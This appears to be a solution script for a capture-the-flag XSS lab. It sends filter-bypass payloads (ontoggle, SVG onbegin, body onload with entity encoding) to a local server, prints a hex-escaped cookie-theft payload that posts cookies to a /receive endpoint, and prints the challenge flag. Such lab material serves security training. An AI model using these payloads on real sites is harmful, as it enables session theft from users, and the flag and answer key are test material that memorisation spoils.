#!/usr/bin/env python3
"""
XSS Filter Bypass - Solution Script
"""
import requests

TARGET = "http://localhost:5001"

def test_payloads():
    """Test various XSS bypass payloads"""
    print("[*] Testing XSS filter bypass payloads...")

    payloads = [
        # Using ontoggle (not blacklisted)
        ("<details open ontoggle=&#97;lert(1)>", "ontoggle + HTML entity encoding"),

        # Using animation events
        ("<svg><animate onbegin=&#97;lert(1) attributeName=x>", "SVG animate onbegin"),

        # Using body onload with encoding
        ("<body/onload=&#97;lert(1)>", "body onload with encoding"),
    ]

    for payload, description in payloads:
        print(f"\n[*] Testing: {description}")
        print(f"    Payload: {payload}")

        try:
            response = requests.post(TARGET, data={
                'name': 'Tester',
                'message': payload
            }, timeout=5)

            if response.status_code == 200:
                print(f"    [+] Payload accepted!")
        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot connect to {TARGET}")
            return

def cookie_theft_payload():
    """Generate payload for cookie theft"""
    print("\n[*] Cookie theft payload:")

    # Encoded to bypass 'document.cookie' filter
    payload = '''<details open ontoggle="fetch('/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:self['\\x64ocument']['\\x63ookie']})})">'''

    print(f"    {payload}")
    print("\n[*] This payload:")
    print("    1. Uses 'ontoggle' event (not in blacklist)")
    print("    2. Uses hex encoding to bypass 'document' and 'cookie' filters")
    print("    3. Sends stolen cookie to /receive endpoint")

if __name__ == '__main__':
    print("=" * 50)
    print("XSS Filter Bypass - Solution")
    print("=" * 50)

    test_payloads()
    cookie_theft_payload()

    print("\n" + "=" * 50)
    print("FLAG: CTF{xss_f1lt3r_byp4ss3d_l1k3_4_pr0}")
    print("=" * 50)
